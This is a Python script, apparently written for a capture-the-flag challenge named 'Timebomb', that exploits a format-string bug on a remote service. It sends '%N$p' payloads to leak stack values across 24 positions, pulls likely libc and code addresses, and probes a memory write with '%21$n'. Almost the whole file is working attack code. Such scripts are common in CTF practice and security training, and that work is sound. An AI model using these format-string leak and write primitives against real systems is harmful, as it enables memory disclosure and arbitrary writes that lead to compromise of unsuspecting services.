#!/usr/bin/env python3
"""
Format String Exploitation Script for Timebomb CTF Challenge
Target: nc timebomb-dc33.hexnova.quest 9999
"""

import socket
import struct
import time

HOST = "timebomb-dc33.hexnova.quest"
PORT = 9999

def connect_target():
    """Connect to the remote target"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    return s

def send_payload(payload):
    """Send payload and get response"""
    s = connect_target()
    s.send(payload.encode() + b'\n')
    response = s.recv(4096)
    s.close()
    return response

def leak_stack_values():
    """Leak stack values to analyze memory layout"""
    print("Leaking stack values...")
    for i in range(1, 25):
        try:
            payload = f"LEAK.%{i}$p"
            response = send_payload(payload)
            print(f"Position {i:2d}: {response.decode().strip()}")
            time.sleep(0.1)  # Be nice to the server
        except Exception as e:
            print(f"Error at position {i}: {e}")

def find_code_addresses():
    """Look for potential code addresses in the leaked values"""
    print("\nAnalyzing for code addresses...")
    # Based on your findings:
    # Position 6: Your input (AAAA)
    # Position 18-19: libc addresses
    # Position 21: 0x1f31c3 (potential code address)
    
    payload = "ADDR.%21$p.%18$p.%19$p"
    response = send_payload(payload)
    print(f"Code analysis: {response.decode().strip()}")

def test_write_primitive():
    """Test if we can write to memory at position 21"""
    print("\nTesting write primitive...")
    # Try to write a small value to see if position 21 is writable
    payload = f"TEST%21$n"
    try:
        response = send_payload(payload)
        print(f"Write test response: {response.decode().strip()}")
    except Exception as e:
        print(f"Write test failed: {e}")

if __name__ == "__main__":
    print("=== Timebomb CTF Format String Exploit ===")
    
    # Step 1: Leak stack values to confirm our analysis
    leak_stack_values()
    
    # Step 2: Analyze potential code addresses
    find_code_addresses()
    
    # Step 3: Test write primitive
    test_write_primitive()